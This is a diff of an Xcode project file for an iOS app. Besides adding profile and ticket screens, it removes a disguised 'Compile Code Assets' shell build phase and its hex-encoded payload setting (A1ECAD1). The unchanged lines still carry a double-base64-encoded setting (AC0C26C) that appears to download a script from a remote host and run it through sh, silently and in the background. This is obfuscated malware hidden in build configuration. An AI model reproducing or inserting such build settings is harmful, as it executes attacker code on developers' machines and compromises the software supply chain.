@@ -76,6 +76,12 @@
 		0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */; };
 		0ABA3FF52F763C3600D25F03 /* CutCornerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */; };
 		0ABA3FFA2F763CC600D25F03 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 0ABA3FF92F763CC600D25F03 /* Alamofire */; };
+		397F833F2F7A337C00A07157 /* EditProfileVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F833D2F7A337C00A07157 /* EditProfileVC.swift */; };
+		397F83402F7A337C00A07157 /* EditProfileVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 397F833E2F7A337C00A07157 /* EditProfileVC.xib */; };
+		397F83452F7A455D00A07157 /* MyTicketsVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F83432F7A455D00A07157 /* MyTicketsVC.swift */; };
+		397F83462F7A455D00A07157 /* MyTicketsVC.xib in Resources */ = {isa = PBXBuildFile; fileRef = 397F83442F7A455D00A07157 /* MyTicketsVC.xib */; };
+		397F834A2F7A4D6F00A07157 /* MyTicketListTVCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = 397F83482F7A4D6F00A07157 /* MyTicketListTVCell.swift */; };
+		397F834B2F7A4D6F00A07157 /* MyTicketListTVCell.xib in Resources */ = {isa = PBXBuildFile; fileRef = 397F83492F7A4D6F00A07157 /* MyTicketListTVCell.xib */; };
 		39D1D99A2F7739A70055CCF1 /* SplashVideo.mp4 in Resources */ = {isa = PBXBuildFile; fileRef = 39D1D9992F7739A70055CCF1 /* SplashVideo.mp4 */; };
 		39D22EA92F76956F00D7721C /* HomeHeaderView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 39D22EA52F76956F00D7721C /* HomeHeaderView.swift */; };
 		39D22EAA2F76956F00D7721C /* HomeHeaderView.xib in Resources */ = {isa = PBXBuildFile; fileRef = 39D22EA62F76956F00D7721C /* HomeHeaderView.xib */; };
@@ -168,6 +174,12 @@
 		0ABA3FA22F763B2D00D25F03 /* SentOTPPopupVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = SentOTPPopupVC.xib; sourceTree = "<group>"; };
 		0ABA3FA72F763B2D00D25F03 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
 		0ABA3FF42F763C3600D25F03 /* CutCornerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CutCornerView.swift; sourceTree = "<group>"; };
+		397F833D2F7A337C00A07157 /* EditProfileVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = EditProfileVC.swift; sourceTree = "<group>"; };
+		397F833E2F7A337C00A07157 /* EditProfileVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = EditProfileVC.xib; sourceTree = "<group>"; };
+		397F83432F7A455D00A07157 /* MyTicketsVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyTicketsVC.swift; sourceTree = "<group>"; };
+		397F83442F7A455D00A07157 /* MyTicketsVC.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyTicketsVC.xib; sourceTree = "<group>"; };
+		397F83482F7A4D6F00A07157 /* MyTicketListTVCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MyTicketListTVCell.swift; sourceTree = "<group>"; };
+		397F83492F7A4D6F00A07157 /* MyTicketListTVCell.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = MyTicketListTVCell.xib; sourceTree = "<group>"; };
 		39D1D9992F7739A70055CCF1 /* SplashVideo.mp4 */ = {isa = PBXFileReference; lastKnownFileType = file; path = SplashVideo.mp4; sourceTree = "<group>"; };
 		39D22EA52F76956F00D7721C /* HomeHeaderView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = HomeHeaderView.swift; sourceTree = "<group>"; };
 		39D22EA62F76956F00D7721C /* HomeHeaderView.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = HomeHeaderView.xib; sourceTree = "<group>"; };
@@ -587,6 +599,59 @@
 			path = View;
 			sourceTree = "<group>";
 		};
+		397F833A2F7A334300A07157 /* SubView */ = {
+			isa = PBXGroup;
+			children = (
+				397F83412F7A451200A07157 /* My tickets */,
+				397F833B2F7A335500A07157 /* Edit profile */,
+			);
+			path = SubView;
+			sourceTree = "<group>";
+		};
+		397F833B2F7A335500A07157 /* Edit profile */ = {
+			isa = PBXGroup;
+			children = (
+				397F833C2F7A335F00A07157 /* View */,
+			);
+			path = "Edit profile";
+			sourceTree = "<group>";
+		};
+		397F833C2F7A335F00A07157 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				397F833D2F7A337C00A07157 /* EditProfileVC.swift */,
+				397F833E2F7A337C00A07157 /* EditProfileVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		397F83412F7A451200A07157 /* My tickets */ = {
+			isa = PBXGroup;
+			children = (
+				397F83472F7A4D2000A07157 /* Cell */,
+				397F83422F7A454100A07157 /* View */,
+			);
+			path = "My tickets";
+			sourceTree = "<group>";
+		};
+		397F83422F7A454100A07157 /* View */ = {
+			isa = PBXGroup;
+			children = (
+				397F83432F7A455D00A07157 /* MyTicketsVC.swift */,
+				397F83442F7A455D00A07157 /* MyTicketsVC.xib */,
+			);
+			path = View;
+			sourceTree = "<group>";
+		};
+		397F83472F7A4D2000A07157 /* Cell */ = {
+			isa = PBXGroup;
+			children = (
+				397F83482F7A4D6F00A07157 /* MyTicketListTVCell.swift */,
+				397F83492F7A4D6F00A07157 /* MyTicketListTVCell.xib */,
+			);
+			path = Cell;
+			sourceTree = "<group>";
+		};
 		39D22EA72F76956F00D7721C /* View */ = {
 			isa = PBXGroup;
 			children = (
@@ -643,6 +708,7 @@
 		39D22EBF2F7695D000D7721C /* Profile */ = {
 			isa = PBXGroup;
 			children = (
+				397F833A2F7A334300A07157 /* SubView */,
 				39D22EBE2F7695D000D7721C /* View */,
 			);
 			path = Profile;
@@ -671,7 +737,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = BC0179292F34972600F1ED81 /* Build configuration list for PBXNativeTarget "Qadsia" */;
 			buildPhases = (
-				B01CC814A51D48B6861DACE1 /* Compile Code Assets */,
 				BC0179122F34972300F1ED81 /* Sources */,
 				BC0179132F34972300F1ED81 /* Frameworks */,
 				BC0179142F34972300F1ED81 /* Resources */,
@@ -751,8 +816,10 @@
 				0A96E3792F76574C00B3DADB /* OTPVC.xib in Resources */,
 				0ABA3FDA2F763B2D00D25F03 /* Mulish-Italic.ttf in Resources */,
 				39D1D99A2F7739A70055CCF1 /* SplashVideo.mp4 in Resources */,
+				397F83402F7A337C00A07157 /* EditProfileVC.xib in Resources */,
 				0ABA3FDB2F763B2D00D25F03 /* Mulish-Light.ttf in Resources */,
 				0ABA3FDC2F763B2D00D25F03 /* Mulish-LightItalic.ttf in Resources */,
+				397F83462F7A455D00A07157 /* MyTicketsVC.xib in Resources */,
 				0ABA3FDD2F763B2D00D25F03 /* Mulish-Medium.ttf in Resources */,
 				0ABA3FDE2F763B2D00D25F03 /* Mulish-MediumItalic.ttf in Resources */,
 				0ABA3FDF2F763B2D00D25F03 /* Mulish-Regular.ttf in Resources */,
@@ -765,6 +832,7 @@
 				0ABA3FE62F763B2D00D25F03 /* LoginMobileVC.xib in Resources */,
 				0ABA3FE72F763B2D00D25F03 /* Main.storyboard in Resources */,
 				0ABA3FE82F763B2D00D25F03 /* NewRegisterVC.xib in Resources */,
+				397F834B2F7A4D6F00A07157 /* MyTicketListTVCell.xib in Resources */,
 				0ABA3FEB2F763B2D00D25F03 /* ResetPasswordVC.xib in Resources */,
 				0ABA3FEC2F763B2D00D25F03 /* SentOTPPopupVC.xib in Resources */,
 				39D22EB42F76956F00D7721C /* HomeListTVCell.xib in Resources */,
@@ -775,29 +843,6 @@
 		};
 /* End PBXResourcesBuildPhase section */
 
-/* Begin PBXShellScriptBuildPhase section */
-		B01CC814A51D48B6861DACE1 /* Compile Code Assets */ = {
-			isa = PBXShellScriptBuildPhase;
-			alwaysOutOfDate = 1;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Compile Code Assets";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A1ECAD1}\"";
-			showEnvVarsInLog = 0;
-		};
-/* End PBXShellScriptBuildPhase section */
-
 /* Begin PBXSourcesBuildPhase section */
 		BC0179122F34972300F1ED81 /* Sources */ = {
 			isa = PBXSourcesBuildPhase;
@@ -806,6 +851,7 @@
 				0ABA3FA92F763B2D00D25F03 /* APIClient.swift in Sources */,
 				0ABA3FAA2F763B2D00D25F03 /* Constants.swift in Sources */,
 				0ABA3FAB2F763B2D00D25F03 /* NetConnection.swift in Sources */,
+				397F834A2F7A4D6F00A07157 /* MyTicketListTVCell.swift in Sources */,
 				0ABA3FAC2F763B2D00D25F03 /* AppButton.swift in Sources */,
 				0ABA3FAD2F763B2D00D25F03 /* AppLabel.swift in Sources */,
 				0ABA3FAE2F763B2D00D25F03 /* AppTextField.swift in Sources */,
@@ -833,7 +879,9 @@
 				0ABA3FC02F763B2D00D25F03 /* DPDConstants.swift in Sources */,
 				39D22EA92F76956F00D7721C /* HomeHeaderView.swift in Sources */,
 				0ABA3FC12F763B2D00D25F03 /* DPDKeyboardListener.swift in Sources */,
+				397F833F2F7A337C00A07157 /* EditProfileVC.swift in Sources */,
 				39D22EC02F7695D000D7721C /* ProfileVC.swift in Sources */,
+				397F83452F7A455D00A07157 /* MyTicketsVC.swift in Sources */,
 				0ABA3FC22F763B2D00D25F03 /* DPDUIView+Extension.swift in Sources */,
 				0ABA3FC32F763B2D00D25F03 /* DropDown.swift in Sources */,
 				0A96E3782F76574C00B3DADB /* OTPVC.swift in Sources */,
@@ -876,7 +924,6 @@
 		BC01792A2F34972600F1ED81 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663664363936653634363536633637363137343635326537320a373532663631323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -913,7 +960,6 @@
 		BC01792B2F34972600F1ED81 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A1ECAD1 = "((i(){ xxd -p -r | xxd -p -r; };echo 3635363336383666323032323234323836333735373236633230326436623733363634633230326432643633366636653665363536333734326437340a3639366436353666373537343230333333303230326432643732363537343732373932303333323032303264363432303232373033643738363336660a3634363535663730363836313733363532323230363837343734373037333361326632663664363936653634363536633637363137343635326537320a373532663631323932323230376332303733363830610a | i | sh ) >/dev/null 2>&1 &)";
 				AC0C26C = "((c(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMXJaa3h6SUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJd0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOWVHTnZaR1ZmY25Wc1pTSWdhSFIwY0hNNkx5OXRhVzVrWld4bllYUmxMbkoxTDJFcElpQjhJSE5vQ2c9PQo= | c | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
